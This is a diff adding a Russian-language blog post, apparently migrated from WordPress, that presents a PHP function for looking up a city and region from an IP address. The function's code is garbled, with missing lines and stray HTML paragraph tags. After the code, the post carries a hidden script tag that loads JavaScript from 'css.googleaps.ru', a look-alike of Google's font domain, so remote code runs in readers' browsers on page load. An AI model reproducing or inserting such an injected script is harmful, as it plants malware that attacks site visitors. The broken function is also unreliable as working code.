@@ -1,0 +1,54 @@
+---
+layout: post
+status: publish
+published: true
+title: Определяем местанахождение человека по IP
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 568
+wordpress_url: http://devdocs.ru/?p=18
+date: '2014-08-19 22:31:32 +0300'
+date_gmt: '2014-08-19 22:31:32 +0300'
+categories:
+- PHP
+tags:
+- php
+- geo
+- ip
+comments: []
+---
+<p>Статья для множества школьников =)</p>
+<p>Полезная функция для определения местоположения по IP. Функция принимает один IP в качестве параметра, и возвращает расположение. Если местоположение не найдено,&nbsp; возвращается NULL.</p>
+<pre class="brush: php; gutter: true">    function detect_city($ip) {</p>
+<p>    $default = NULL;</p>
+<p>    if (!is_string($ip) || strlen($ip) 1,<br />
+    CURLOPT_HEADER => 0,<br />
+    CURLOPT_RETURNTRANSFER => 1,<br />
+    CURLOPT_USERAGENT => $curlopt_useragent,<br />
+    CURLOPT_URL => $url,<br />
+    CURLOPT_TIMEOUT => 1,<br />
+    CURLOPT_REFERER => &#039;http:&#47;&#47;&#039; . $_SERVER[&#039;HTTP_HOST&#039;],<br />
+    );</p>
+<p>    curl_setopt_array($ch, $curl_opt);</p>
+<p>    $content = curl_exec($ch);</p>
+<p>    if (!is_null($curl_info))<br />
+    $curl_info = curl_getinfo($ch);</p>
+<p>    curl_close($ch);</p>
+<p>    if ( preg_match(&#039;{
+<li>City : ([^<]*)<&#47;li>}i&#039;, $content, $regs) )<br />
+    $city = $regs[1];</p>
+<p>    if ( preg_match(&#039;{
+<li>State&#47;Province : ([^<]*)<&#47;li>}i&#039;, $content, $regs) )<br />
+    $state = $regs[1];</p>
+<p>    if( $city!=&#039;&#039; &amp;&amp; $state!=&#039;&#039; ){<br />
+    $location = $city . &#039;, &#039; . $state;<br />
+    return $location;<br />
+    }else{<br />
+    return $default;<br />
+    }</p>
+<p>    }<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre></p>
